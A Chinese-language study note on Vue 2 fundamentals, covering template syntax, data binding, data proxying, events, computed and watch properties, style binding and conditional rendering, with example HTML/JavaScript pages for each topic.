---
title: Vue学习笔记
abbrlink: vueStudyNote
date: 2021-10-09 12:40:56
tags:
  - Vue
categories:
  - 大前端
  - Vue
---
## Vue的特点
	1. 采用组件化模式，提高代码复用率、且让代码更好维护。
	2. 声明式编码，让编码人员无需直接操作DOM，提高开发效率。
	3. 使用虚拟DOM+优秀的Diff算法，尽量复用DOM节点。

## Vue官网
![在这里插入图片描述](https://img-blog.csdnimg.cn/1883a58d95f24b4b98693ac009829e60.png)
			教程：入门教程
			API	: 类似于字典
			风格指南：Vue官方推荐编码规范
			示例：官方示例
			Cookbook: Vue的一些技巧

	![在这里插入图片描述](https://img-blog.csdnimg.cn/8a099dbdfc9c4e889c54c2bfbd0c29d0.png)
	一些在工作中要用到的。

##  初识Vue
			1.想让Vue工作，就必须创建一个Vue实例，且要传入一个配置对象；
	        2.root容器里的代码依然符合html规范，只不过混入了一些特殊的Vue语法；
	        3.root容器里的代码被称为【Vue模板】；
	        4.Vue实例和容器是一一对应的；
	        5.真实开发中只有一个Vue实例，并且会配合着组件一起使用；
	        6.{{xxx}}中的xxx要写js表达式，且xxx可以自动读取到data中的所有属性；
	        7.一旦data中的数据发生改变，那么页面中用到该数据的地方也会自动更新；

> 注意区分：js表达式和js代码(语句)
                1.表达式：一个表达式会产生一个值，可以放在任何一个需要值的地方。
                    （1）. a
                    （2）. a+b
                    （3）. demo(1)
                    （4）. x===y?'a':'b'
                2.js代码（语句）
                    （1）. if(){}
                    （2）. for(){}

## 模板语法
	Vue模板语法有2大类：
					1.插值语法：
							功能：用于解析标签体内容。
							写法：{{xxx}}，xxx是js表达式，且可以直接读取到data中的所有属性。
					2.指令语法：
							功能：用于解析标签（包括：标签属性、标签体内容、绑定事件.....）。
							举例：v-bind:href="xxx" 或  简写为 :href="xxx"，xxx同样要写js表达式，
									 且可以直接读取到data中的所有属性。
							备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>模板语法</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <h1>插值语法</h1>
        <h3>你好,{{name}}</h3>
        <hr />
        <h1>指令语法</h1>
        <a v-bind:href="school.url" x="hello">点我去{{school.name}}学习1</a>
        <!-- <a :href="url" x="hello">点我去学习2</a> -->
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name: 'jack',
            school: {
                name: '尚硅谷',
                url: 'http://www.atguigu.com'
            }
        }
    })
</script>

```

## 数据绑定
 	 Vue中有2种数据绑定的方式：
					1.单向绑定(v-bind)：数据只能从data流向页面。
					2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
						备注：
								1.双向绑定一般都应用在表单类元素上（如：input、select等）
								2.v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>数据绑定</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <!-- 普通写法 -->
        单向数据绑定:<input type="text" v-bind:value="name"></input><br>
        双向数据绑定:<input type="text" v-model:value="name"></input>

        <!-- 简写 -->
        单向数据绑定:<input type="text" :value="name"></input><br>
        双向数据绑定:<input type="text" v-model="name"></input>

        <!-- 如下代码是错误的，因为v-model只能应用在表单类元素（输入类元素）上 -->
        <h2 v-model:value="name">你好啊</h2>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    new Vue({
        el: '#root',
        data: {
            name: 'jack'
        }
    })
</script>

</html>
```

## el与data的两种写法
	data与el的2种写法
	1.el有2种写法
					(1).new Vue时候配置el属性。
					(2).先创建Vue实例，随后再通过vm.$mount('#root')指定el的值。
	2.data有2种写法
					(1).对象式
					(2).函数式
					如何选择：目前哪种写法都可以，以后学习到组件时，data必须使用函数式，否则会报错。
	3.一个重要的原则：
					由Vue管理的函数，一定不要写箭头函数，一旦写了箭头函数，this就不再是Vue实例了。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 

	-->

    <!-- 准备好一个容器 -->
    <div id="root">
        <h1>你好，{{name}}</h1>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false

        // el的两种写法
        /* const v = new Vue({
            // el: "#root",     // 第一种写法
            data: {
                name: "xxc"
            }
        })
        setTimeout(() => {
            v.$mount("#root")   // 第二种写法
        }, 1000); */

        // data的两种写法
        new Vue({
            el: '#root',
            // data的第一种写法：对象式
            /* 
                data:{
                    name:'xxc'
                }
            */

            // data的第二种写法：函数式
            data() {
                console.log("@@@", this)    // 此处的this是Vue实例对象
                return {
                    name: 'xxc'
                }
            }
        })
    </script>
</body>

</html>
```

## MVVM模型
	MVVM模型
				1. M：模型(Model) ：data中的数据
				2. V：视图(View) ：模板代码
				3. VM：视图模型(ViewModel)：Vue实例
	观察发现：
				1.data中所有的属性，最后都出现在了vm身上。
				2.vm身上所有的属性 及 Vue原型上所有属性，在Vue模板中都可以直接使用。
![在这里插入图片描述](https://img-blog.csdnimg.cn/50390ab41c97463da76d4461ec3abcf8.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/0870af01bada4e8da08f2333a12558b3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <!-- View -->
        <h1>学校名称:{{name}}</h1>
        <h1>学校地址:{{address}}</h1>
        <h1>测试一下1:{{1+1}}</h1>
        <h1>测试一下2:{{$options}}</h1>
        <h1>测试一下3:{{$emit}}</h1>
        <h1>测试一下4:{{_c}}</h1>
    </div>
</body>
<script type="text/javascript">
    Vue.config.productionTip = false
    const vm = new Vue({   // ViewModel
        el: "#root",
        data: {
            // Model
            name: "xxc",
            address: '北京'
        }
    })
    console.log(vm);
</script>

</html>
```



## Object.defineProperty方法

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>1.Object.defineProperty方法</title>
</head>

<body>
    <script type="text/javascript">
        let number = 18

        let person = {
            name: '张三',
            sex: '男',
        }
        /* Object.defineProperty(person, 'age', {
            value: 18
        }) */

        Object.defineProperty(person, 'age', {
            // value: 18,
            // enumerable: true,    // 控制属性是否可以枚举，默认值是false
            // writable: true,  // 控制属性是否可以被修改，默认值是false
            // configurable: true,   // 控制属性是否可以被删除，默认值是false

            // 当有人读取person的age属性（person.age）时，get函数(getter)就会被调用，且返回值就是age的值
            get() {
                console.log("有人读取age属性了")
                return number
            },

            // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值
            set(value) {
                console.log('有人修改了age属性，且值是', value)
                number = value
            }
        })

        // console.log(person)
        // console.log(Object.keys(person))
    </script>
</body>

</html>
```

## 数据代理
###  何为数据代理
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
</head>

<body>
    <!-- 数据代理：通过一个对象代理对另一个对象中的属性的操作(读/写) -->
    <script type="text/javascript">
        let obj = { x: 100 }
        let obj2 = { y: 200 }

        Object.defineProperty(obj2, 'x', {
            get() {
                return obj.x
            },
            set(value) {
                obj.x = value
            }
        })
    </script>
</body>

</html>
```

### Vue中的数据代理

	1.Vue中的数据代理：
				通过vm对象来代理data对象中属性的操作（读/写）
	2.Vue中数据代理的好处：
				更加方便的操作data中的数据
	3.基本原理：
				通过Object.defineProperty()把data对象中所有属性添加到vm上。
				为每一个添加到vm上的属性，都指定一个getter/setter。
				在getter/setter内部去操作（读/写）data中对应的属性。

![在这里插入图片描述](https://img-blog.csdnimg.cn/74cc194015cd49179d2670ec59aeec27.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        <!-- <h2>学校名称:{{_data.name}}</h2>
        <h2>学校地址:{{_data.address}}</h2> -->
        <h2>学校名称:{{name}}</h2>
        <h2>学校地址:{{address}}</h2>
    </div>
    <script type="text/javascript">
        Vue.config.productionTip = false

        let data = {
            name: "xxc",
            address: '宏福科技园'
        }

        const vm = new Vue({
            el: "#root",
            data    // 此时在控制台中输入vm._data === data会得到true
        })
    </script>
</body>

</html>
```

> 注意点：
> ![在这里插入图片描述](https://img-blog.csdnimg.cn/45323414302c4d9da9bd5c0627e0765a.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)
在Vue中，为了实现data数据改变后页面同时发生响应式变化，故此处使用了数据劫持（注意并非数据代理）

## 事件的基本使用

        事件的基本使用：
    		1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
    		2.事件的回调需要配置在methods对象中，最终会在vm上；
    		3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
    		4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
    		5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参，且$event的位置与形参位置一一对应；

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- <button v-on:click="showInfo">点我提示信息</button> -->
        <button @click="showInfo1">点我提示信息1(不传参)</button>
        <button @click="showInfo2(66,$event)">点我提示信息2(传参)</button>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        const vm = new Vue({
            el: "#root",
            data: {
                name: "xxc"
            },
            methods: {  // methods中不会做数据代理
                showInfo1(event) {
                    // console.log(event.target.innerText)
                    // console.log(this) // 此处的this是vm
                    alert('同学你好!')
                },
                showInfo2(number, a) {
                    console.log(number, a)
                    // alert('同学你好!!')
                }
            }
        })
    </script>
</body>

</html>
```

## 事件修饰符
       Vue中的事件修饰符：
               1.prevent：阻止默认事件（常用）；
               2.stop：阻止事件冒泡（常用）；
               3.once：事件只触发一次（常用）；
               4.capture：使用事件的捕获模式；
               5.self：只有event.target是当前操作的元素时才触发事件；
               6.passive：事件的默认行为立即执行，无需等待事件回调执行完毕；

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>Document</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
    <style>
        * {
            margin-top: 20px;
        }

        .demo1 {
            height: 50px;
            background-color: skyblue;
        }

        .box1 {
            padding: 5px;
            background-color: skyblue;
        }

        .box2 {
            padding: 5px;
            background-color: orange;
        }

        .list {
            width: 200px;
            height: 200px;
            background-color: peru;
            overflow: auto;
        }

        li {
            height: 100px;
        }
    </style>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- 阻止默认事件(常用) -->
        <a href="http://www.atguigu.com" @click.prevent="showInfo">点我提示信息</a>
        <!-- 阻止事件冒泡(常用) -->
        <div class="demo1" @click="showInfo">
            <button @click.stop="showInfo">点我提示信息</button>
        </div>

        <!-- 事件只触发1次 -->
        <button @click.once="showInfo">点我提示信息</button>

        <!-- 使用事件的捕获模式 -->
        <div class="box1" @click.capture="showMsg(1)">
            div1
            <div class="box2" @click="showMsg(2)">
                div2
            </div>
        </div>

        <!-- 只有event.target是当前操作的元素时才触发事件； -->
        <!-- 注意此处showInfo两次执行传递的e都是button -->
        <div class="demo1" @click.self="showInfo">
            <button @click="showInfo">点我提示信息</button>
        </div>

        <!-- passive：事件的默认行为立即执行，无需等待事件回调执行完毕(并非所有事件都会等待事件回调执行完毕，比如scroll) -->
        <!-- <ul @scroll="demo" class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul> -->
        <ul @wheel.passive="demo" class="list">
            <li>1</li>
            <li>2</li>
            <li>3</li>
            <li>4</li>
        </ul>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false

        new Vue({
            el: "#root",
            data: {
                name: "xxc"
            },
            methods: {
                showInfo(e) {
                    // e.preventDefault();
                    // e.stopPropagation();
                    console.log(e.target)
                },
                showMsg(msg) {
                    console.log(msg)
                },
                demo() {
                    for (let i = 0; i < 10000; i++) {
                        console.log('#')
                    }
                    console.log('累坏了')
                }
            }
        })
    </script>
</body>

</html>
```

## 键盘事件
        1.Vue中常用的按键别名：
    						回车 => enter
    						删除 => delete (捕获“删除”和“退格”键)
    						退出 => esc
    						空格 => space
    						换行 => tab (特殊，必须配合keydown去使用)
    						上 => up
    						下 => down
    						左 => left
    						右 => right
    
        2.Vue未提供别名的按键，可以使用按键原始的key值去绑定，但注意要转为kebab-case（短横线命名）
    
        3.系统修饰键（用法特殊）：ctrl、alt、shift、meta
                    (1).配合keyup使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发。
                    (2).配合keydown使用：正常触发事件。
    
        4.也可以使用keyCode去指定具体的按键（不推荐）
    
        5.Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>键盘事件</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>欢迎来到{{name}}学习</h2>
        <!-- <input type="text" placeholder="按下回车提示输入" @keyup.enter="showInfo"> -->
        <!-- <input type="text" placeholder="按下回车提示输入" @keyup.caps-lock="showInfo"> -->
        <!-- <input type="text" placeholder="按下回车提示输入" @keydown.tab="showInfo"> -->
        <!-- <input type="text" placeholder="按下回车提示输入" @keyup.meta="showInfo">
            <input type="text" placeholder="按下回车提示输入" @keydown.meta="showInfo"> -->
        <input type="text" placeholder="按下回车提示输入" @keydown.13="showInfo">
         <input type="text" placeholder="按下回车提示输入" @keydown.huiche="showInfo">
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        Vue.config.keyCodes.huiche = 13 // 定义了一个别名按键

        new Vue({
            el: "#root",
            data: {
                name: "xxc"
            },
            methods: {
                showInfo(e) {
                    console.log(e.key, e.keyCode)
                    // if (e.keyCode !== 13) return
                    console.log(e.target.value)
                }
            }
        })
    </script>
</body>

</html>
```

## 事件补充
> 1.![在这里插入图片描述](https://img-blog.csdnimg.cn/8a7e3fad611b404eaf0673a3c52b0900.png)

> 2.![在这里插入图片描述](https://img-blog.csdnimg.cn/4dda73f036c84b90a73b01c03e476c87.png)

## 计算属性
![在这里插入图片描述](https://img-blog.csdnimg.cn/a99a21d372884300908ea0320fedc2b3.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjE2Njkw,size_16,color_FFFFFF,t_70)

###  插值语法实现
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>姓名案例</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        姓: <input type="text" v-model="firstName"> <br>
        名: <input type="text" v-model="lastName"> <br>
        <!-- 全名: <span>{{firstName+'-'+lastName}}</span> -->
        全名: <span>{{firstName.slice(0,3)}}-{{lastName}}</span>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                firstName: '张',
                lastName: '三'
            }
        })
    </script>
</body>

</html>
```

###  methods方法实现
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>2.姓名案例_methods实现</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        姓: <input type="text" v-model="firstName"> <br>
        名: <input type="text" v-model="lastName"> <br>
        <!-- 全名: <span>{{firstName+'-'+lastName}}</span> -->
        全名: <span>{{fullName()}}</span>
        全名: <span>{{fullName()}}</span>
        全名: <span>{{fullName()}}</span>
        全名: <span>{{fullName()}}</span>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        new Vue({
            el: "#root",
            data: {
                firstName: '张',
                lastName: '三'
            },
            methods: {
                fullName() {
                    console.log('@---fullName')
                    return this.firstName + '-' + this.lastName
                }
            }
        })
    </script>
</body>

</html>
```

###  计算属性实现
```javascript
<!DOCTYPE html>
<html>
	<head>
		<meta charset="UTF-8" />
		<title>姓名案例_计算属性实现</title>
		<!-- 引入Vue -->
		<script type="text/javascript" src="../js/vue.js"></script>
	</head>
	<body>
		<!-- 准备好一个容器-->
		<div id="root">
			姓：<input type="text" v-model="firstName"> <br/><br/>
			名：<input type="text" v-model="lastName"> <br/><br/>
			测试：<input type="text" v-model="x"> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			<!-- 全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> <br/><br/>
			全名：<span>{{fullName}}</span> -->
		</div>
	</body>

	<script type="text/javascript">
		Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。

		const vm = new Vue({
			el:'#root',
			data:{
				firstName:'张',
				lastName:'三',
				x:'你好'
			},
			methods: {
				demo(){
					
				}
			},
			computed:{
				fullName:{
					//get有什么作用？当有人读取fullName时，get就会被调用，且返回值就作为fullName的值
					//get什么时候调用？1.初次读取fullName时。2.所依赖的数据发生变化时。
					get(){
						console.log('get被调用了')
						// console.log(this) //此处的this是vm
						return this.firstName + '-' + this.lastName
					},
					//set什么时候调用? 当fullName被修改时。
					set(value){
						console.log('set',value)
						const arr = value.split('-')
						this.firstName = arr[0]
						this.lastName = arr[1]
					}
				}
			}
		})
	</script>
</html>
```


- 结论
>计算属性：
					1.定义：要用的属性不存在，要通过已有属性计算得来。
					2.原理：底层借助了Objcet.defineproperty方法提供的getter和setter。
					3.get函数什么时候执行？
								(1).初次读取时会执行一次。
								(2).当依赖的数据发生改变时会被再次调用。
					4.优势：与methods实现相比，内部有缓存机制（复用），效率更高，调试方便。
					5.备注：
							1.计算属性最终会出现在vm上，直接读取使用即可。
							2.如果计算属性要被修改，那必须写set函数去响应修改，且set中要引起计算时依赖的数据发生改变。


### 计算属性简写
> 大多数情况下，计算属性只用写get，而不用写set，故可简写为以下形式:
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>4.姓名案例_计算属性简写</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        姓: <input type="text" v-model="firstName"> <br>
        名: <input type="text" v-model="lastName"> <br>
        全名: <span>{{fullName}}</span> <br />
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        const vm = new Vue({
            el: "#root",
            data: {
                firstName: '张',
                lastName: '三',
            },
            computed: {
                // 完整写法
                /* fullName: {
                    get() {
                        console.log('get被调用了')
                        return this.firstName + '-' + this.lastName
                    },
                    set(value) {
                        console.log(value)
                        const arr = value.split('-')
                        this.firstName = arr[0]
                        this.lastName = arr[1]
                    }
                } */
                // 简写
                fullName() {
                    console.log('get被调用了')
                    return this.firstName + '-' + this.lastName
                }
            }
        })
    </script>
</body>

</html>
```

## 监视属性
###  天气案例
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>天气案例</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>今天天气很{{info}},{{x}}</h2>
        <!-- 绑定事件的时候@xxx="yyy" yyy可以写一些简单的语句 -->
        <!-- <button @click="isHot = !isHot">切换天气</button>
        <button @click="isHot = !isHot;x++">切换天气</button> -->
        <button @click="changeWeather">切换天气</button>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                x: 1
            },
            computed: {
                info() {
                    return this.isHot ? '热' : '冷'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            }
        })
    </script>
</body>

</html>
```

### 监视属性
     监视属性watch：
         1.当被监视的属性变化时, 回调函数自动调用, 进行相关操作
         2.监视的属性必须存在，才能进行监视！！
         3.监视的两种写法：
                 (1).new Vue时传入watch配置
                 (2).通过vm.$watch监视
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>2.天气案例_监视属性</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                x: 1
            },
            computed: {
                info() {
                    return this.isHot ? '热' : '冷'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            /* watch: {
                isHot: {
                    immediate: true,    // 初始化时让handler调用一下
                    // handler什么时候调用?当isHot发生改变时。
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue)
                    }
                },
                info: {
                    immediate: true,    // 初始化时让handler调用一下
                    // handler什么时候调用?当isHot发生改变时。
                    handler(newValue, oldValue) {
                        console.log('info被修改了', newValue, oldValue)
                    }
                }
            } */
        })

        vm.$watch('isHot', {
            immediate: true,    // 初始化时让handler调用一下
            // handler什么时候调用?当isHot发生改变时。
            handler(newValue, oldValue) {
                console.log('isHot被修改了', newValue, oldValue)
            }
        })
    </script>
</body>

</html>
```

###  深度监视
      深度监视：
              (1).Vue中的watch默认不监测对象内部值的改变（一层）。
              (2).配置deep:true可以监测对象内部值改变（多层）。
      备注：
              (1).Vue自身可以监测对象内部值的改变，但Vue提供的watch默认不可以！
              (2).使用watch时根据数据的具体结构，决定是否采用深度监视。
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>3.天气案例_深度监视</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
        <hr>
        <h3>a的值是:{{numbers.a}}</h3>
        <button @click='numbers.a++'>点我让a+1</button>
        <h3>b的值是:{{numbers.b}}</h3>
        <button @click='numbers.b++'>点我让b+1</button>
        <!-- <button @click='numbers = {a:666,b:888}'>彻底替换掉numbers</button> -->

        {{numbers.c.d.e}}

    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
                numbers: {
                    a: 1,
                    b: 1,
                    c: {
                        d: {
                            e: 100
                        }
                    }
                }
            },
            computed: {
                info() {
                    return this.isHot ? '热' : '冷'
                }
            },
            methods: {
                changeWeather() {
                    this.isHot = !this.isHot
                }
            },
            watch: {
                isHot: {
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue)
                    }
                },
                // 监视多级结构中某个属性的变化
                /* 'numbers.a': {
                    handler() {
                        console.log('a被改变了')
                    }
                } */
                // 监视多级结构中所有属性的变化
                numbers: {
                    deep: true,
                    handler() {
                        console.log('number改变了')
                    }
                }
            }
        })

    </script>
</body>

</html>
```

### 监视属性简写
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>4.天气案例_监视属性_简写</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器 -->
    <div id="root">
        <h2>今天天气很{{info}}</h2>
        <button @click="changeWeather">切换天气</button>
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        const vm = new Vue({
            el: '#root',
            data: {
                isHot: true,
            },
            watch: {
                // 正常写法
                /* isHot: {
                    // immediate:true, // 初始化时让handler调用一下
                    // deep:true,  // 深度监视
                    handler(newValue, oldValue) {
                        console.log('isHot被修改了', newValue, oldValue)
                    }
                } */
                // 简写
                isHot(newValue, oldValue) {
                    console.log('isHot被修改了', newValue, oldValue)
                }
            }
        })

        // 正常写法
        vm.$watch('isHot', {
            immediate: true, // 初始化时让handler调用一下
            deep: true,  // 深度监视
            handler(newValue, oldValue) {
                console.log('isHot被修改了', newValue, oldValue)
            }
        })

        // 此处不能写箭头函数,会导致this发生改变。
        vm.$watch('isHot', function (newValue, oldValue) {
            console.log('isHot被修改了', newValue, oldValue)
        })
    </script>
</body>

</html>
```

### 监视属性和计算属性的差别
      computed和watch之间的区别：
              1.computed能完成的功能，watch都可以完成。
              2.watch能完成的功能，computed不一定能完成，例如：watch可以进行异步操作。(因为计算属性要靠return的返回值，而我们无法让其等一等再有返回值)
      两个重要的小原则：
                  1.所被Vue管理的函数，最好写成普通函数，这样this的指向才是vm 或 组件实例对象。
                  2.所有不被Vue所管理的函数（定时器的回调函数、ajax的回调函数等、Promise的回调函数），最好写成箭头函数，
                      这样this的指向才是vm 或 组件实例对象。

```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>5.监视属性和计算属性的差别</title>
    <!-- 引入Vue -->
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <div id="root">
        姓: <input type="text" v-model="firstName"> <br>
        名: <input type="text" v-model="lastName"> <br>
        全名: <span>{{fullName}}</span> <br />
    </div>

    <script type="text/javascript">
        Vue.config.productionTip = false
        const vm = new Vue({
            el: "#root",
            data: {
                firstName: '张',
                lastName: '三',
                fullName: '张-三'
            },
            watch: {
                firstName(val) {
                    /* setTimeout(function () {
                        // 此时this是window，因为定时器是js引擎调用的。
                        this.fullName = val + '-' + this.lastName
                    }, 1000); */
                    // 若在计算属性中写，返回值无法返回给fullName。而是返回给setTimeout的函数。
                    setTimeout(() => {
                        // 此时找不到this，会去找firstName的this(及vm)。
                        this.fullName = val + '-' + this.lastName
                    }, 1000);
                },
                lastName(val) {
                    this.fullName = this.firstName + '-' + val
                }
            }
        })
    </script>
</body>

</html>
```

## 绑定样式
	绑定样式：
			1. class样式
						写法:class="xxx" xxx可以是字符串、对象、数组。
								字符串写法适用于：类名不确定，要动态获取。
								对象写法适用于：要绑定多个样式，个数不确定，名字也不确定。
								数组写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用。
			2. style样式
						:style="{fontSize: xxx}"其中xxx是动态值。
						:style="[a,b]"其中a、b是样式对象。
```javascript
<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8" />
    <title>绑定样式</title>
    <style>
        .basic {
            width: 400px;
            height: 100px;
            border: 1px solid black;
        }

        .happy {
            border: 4px solid red;
            ;
            background-color: rgba(255, 255, 0, 0.644);
            background: linear-gradient(30deg, yellow, pink, orange, yellow);
        }

        .sad {
            border: 4px dashed rgb(2, 197, 2);
            background-color: gray;
        }

        .normal {
            background-color: skyblue;
        }

        .atguigu1 {
            background-color: yellowgreen;
        }

        .atguigu2 {
            font-size: 30px;
            text-shadow: 2px 2px 10px red;
        }

        .atguigu3 {
            border-radius: 20px;
        }
    </style>
    <script type="text/javascript" src="../js/vue.js"></script>
</head>

<body>
    <!-- 准备好一个容器-->
    <div id="root">
        <!-- 绑定class样式--字符串写法。适用于:样式的类名不确定，需要动态指定。 -->
        <div class="basic" :class='mood' @click="changeMood">{{name}}</div><br><br>

        <!-- 绑定class样式--数组写法。适用于:要绑定的样式个数不确定，名字也不确定 -->
        <div class="basic" :class="classArr">{{name}}</div><br><br>

        <!-- 绑定class样式--对象写法。适用于:要绑定的样式个数确定，名字也确定，但要动态决定用不用 -->
        <div class="basic" :class="classObj">{{name}}</div><br><br>

        <!-- 绑定style样式 -- 对象写法 -->
        <div class="basic" :style="{fontSize:fsize+'px'}">{{name}}</div>
        <div class="basic" :style="styleObj">{{name}}</div>
        <!-- 绑定style样式 -- 数组写法 -->
        <div class="basic" :style="[styleObj,styleObj2]">{{name}}</div>
        <div class="basic" :style="styleArr">{{name}}</div>
    </div>
</body>

<script type="text/javascript">
    Vue.config.productionTip = false

    const vm = new Vue({
        el: '#root',
        data: {
            name: 'xxc',
            mood: 'normal',
            classArr: ['atguigu1', 'atguigu2', 'atguigu3'],
            classObj: {
                atguigu1: false,
                atguigu2: false
            },
            fsize: 40,
            styleObj: {
                fontSize: '40px',
                color: 'red',
            },
            styleObj2: {
                backgroundColor: 'skyblue'
            },
            styleArr: [
                {
                    fontSize: '40px',
                    color: 'red',
                },
                {
                    backgroundColor: 'skyblue'
                }
            ]
        },
        methods: {
            changeMood() {
                const arr = ['happy', 'sad', 'normal']
                this.mood = arr[Math.floor(Math.random() * 3)]
            }
        },
    })
</script>

</html>
```

## 条件渲染
    条件渲染：
       1.v-if
                   写法：
                           (1).v-if="表达式" 
                           (2).v-else-if="表达式"
                           (3).v-else="表达式"
                   适用于：切换频率较低的场景。
                   特点：不展示的DOM元素直接被移除。
                   注意：v-if可以和:v-else-if、v-else一起使用，但要求结构不能被“打断”。
    
       2.v-show
                   写法：v-show="表达式"
                   适用于：切换频率较高的场景。
